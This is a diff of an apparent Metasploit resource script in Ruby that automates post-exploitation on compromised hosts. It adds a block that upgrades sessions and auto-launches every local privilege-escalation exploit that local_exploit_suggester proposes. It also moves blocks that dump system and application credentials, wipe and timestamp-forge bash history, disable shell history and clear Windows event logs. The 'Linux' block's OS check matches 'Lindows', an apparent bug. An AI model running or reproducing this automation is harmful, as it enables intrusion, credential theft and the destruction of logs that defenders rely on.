@@ -739,20 +739,6 @@ if (framework.sessions.length > 0)
   end
 end
 
-
-# Post exploit on Linux
-if (framework.sessions.length > 0)
-  framework.db.hosts.each do |host|
-    if (host.os_name =~ /[Ll]indows/)
-      	run_single("sys_creds -s 1")
-      	run_single("sessions -i 1 -c 'echo > ~/.bash_history'")
-	run_single("sessions -i 1 -c 'touch -r /etc/passwd ~/.bash_history'")
-	run_single("sessions -i 1 -c 'export HISTSIZE=0'")
-    end
-  end
-end
-
-
 # If there is an web service, do it's own scan
 framework.db.hosts.each do |host|
     host.services.each do |serv|
@@ -767,17 +753,6 @@ framework.db.hosts.each do |host|
 	end
       end
     end
-end
-
-# Post exploit on Windows
-if (framework.sessions.length > 0)
-  framework.db.hosts.each do |host|
-    if (host.os_name =~ /[Ww]indows/)
-      	run_single("app_creds -s 1")
-      	run_single("sys_creds -s 1")
-      	run_single("clearev")
-    end
-  end
 end
 
 # After dump Windows hashes, try sys access with psexec
@@ -804,6 +779,64 @@ framework.db.hosts.each do |host|
         end
       end
     end
+end
+
+# If there're some session, get some exploits for scalate to root \ admin
+expl = ''
+log = ''
+if (framework.sessions.length > 0)
+	sess = framework.sessions.length
+	print_good("#{sess}")
+	run_single("sessions -u #{sess}")
+	meter = sess + 1
+	run_single("use post/multi/recon/local_exploit_suggester")
+	run_single("set session #{meter}")
+	run_single("spool /root/output.txt")
+	run_single("run")
+	run_single("back")
+	file = File.open("/root/output.txt", "r")
+	log = file.read
+	log.each_line do |line|
+    		if line =~ /.* - exploit.*/
+        		expl += line
+    		end 
+	end 
+	run_single("spool off")
+	file.close
+	File.delete('/root/output.txt')
+
+	expl.gsub!(/.*\d.\d.\d.\d - /) { '' }
+	expl.gsub!(/:\s.*/) { '' }
+	expl.each_line do |line|
+		run_single("use #{line}")
+		run_single("set session #{meter}")
+		run_single("exploit -j")
+	end
+	run_single("sessions -l")
+#
+end
+
+# Post exploit on Linux
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ll]indows/)
+      	run_single("sys_creds -s 1")
+      	run_single("sessions -i 1 -c 'echo > ~/.bash_history'")
+	run_single("sessions -i 1 -c 'touch -r /etc/passwd ~/.bash_history'")
+	run_single("sessions -i 1 -c 'export HISTSIZE=0'")
+    end
+  end
+end
+
+# Post exploit on Windows
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ww]indows/)
+      	run_single("app_creds -s 1")
+      	run_single("sys_creds -s 1")
+      	run_single("clearev")
+    end
+  end
 end
 
 # Generate a XML report if there are some open session
